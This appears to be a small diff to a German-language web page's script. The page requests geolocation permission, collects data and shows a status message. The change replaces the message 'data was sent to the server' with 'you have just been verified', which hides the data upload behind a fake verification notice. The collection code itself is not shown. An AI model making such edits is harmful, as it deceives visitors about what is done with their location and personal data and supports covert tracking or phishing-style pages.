@@ -169,7 +169,7 @@
       const geoStatus = await getGeoPermission();
       const data = await collectData(geoStatus);
 
-      const done = (msg='✅ Daten wurden an den Server gesendet.') => {
+      const done = (msg='✅ Du wurdest soeben verifiziert.') => {
         const s = document.getElementById('status'); s.textContent = msg; s.className = 'ok';
       };
       const fail = (err) => {
